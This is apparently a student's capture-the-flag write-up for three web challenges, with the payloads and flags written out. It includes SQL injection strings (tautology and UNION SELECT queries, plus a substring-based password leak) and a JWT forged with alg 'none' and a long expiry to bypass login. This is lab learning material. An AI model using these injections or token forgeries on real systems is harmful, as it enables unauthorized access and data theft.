<# 1. databaseincursionv2

## Solution:
```
-  ' OR '1'='1' -- 
-  ' OR department='Management' -- 
-  Kiwi' AND department='Management' -- 
-  ' UNION SELECT * FROM metadata -- 
-  ' UNION SELECT secrets, NULL, NULL, NULL FROM CITADEL_ARCHIVE_2077 -- 
```


## Flag:
```
CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}
```

## Concepts learnt:

- Learnt more about SQL and SQLi

## Resources:

- Took hints for doing this, got to know that union should be used.
- https://portswigger.net/web-security/sql-injection/union-attacks


# 2. temporal token

## Solution:

- First I inspected the page to look at the cookies. I figured out that there is no token called cookie. So I added a token cookie with a value token and reloaded the page.
- When i tried to log in, it said valid credentials but still didnt let me in the site.
- When i looked at the value of the token cookie i added it changed to a jwt encoded line
- I used jwt.io to get the header, payload, signature of that encoded line
- After a lot of inspection, i figured out that its a symmetric key algorithm, and it has exp: 0 which makes it expired instantly.
- I then changed that existing jwt : Alg- none and exp: 9999999999
- When i used this exact value in the page it gave me the flag.

## Flag:
```
nite{50_y0u_kn0w_h0w_jw75_w0rk_n0w?}
```

## Concepts Learnt:
- How payloads,headers work in websites.
- How to bypass these.

## Resources:
- https://www.jwt.io/introduction#what-is-json-web-token

# 3. Oneshot

## Solution: 
- When I opened the site I saw that we only get one chance to run a query + guess the password.
- Noticed that every new session gets a completely new table id, so queries from previous sessions won’t work.
- I tried different queries and finally used this one to leak 1 character at a time:

```
' AND 0 UNION ALL SELECT substr(password,1,1) FROM table_9f3c1ab774e528d0
' AND 0 
UNION ALL SELECT substr(password,1,1) FROM table_9f3c1ab774e528d0 
UNION ALL SELECT substr(password,2,1) FROM table_9f3c1ab774e528d0 
UNION ALL SELECT substr(password,32,1) FROM table_9f3c1ab774e528d0 --
```

- Showed output in jumbled form which after gave me the flag

# Flag:
```
nite{are_you_feeling_the_heat_now:)}
```

## Concepts Learned:
- SQL Injection (UNION based + substring extraction)

## Resources:
- Chatgpt carried me throughout the whole thing.

    
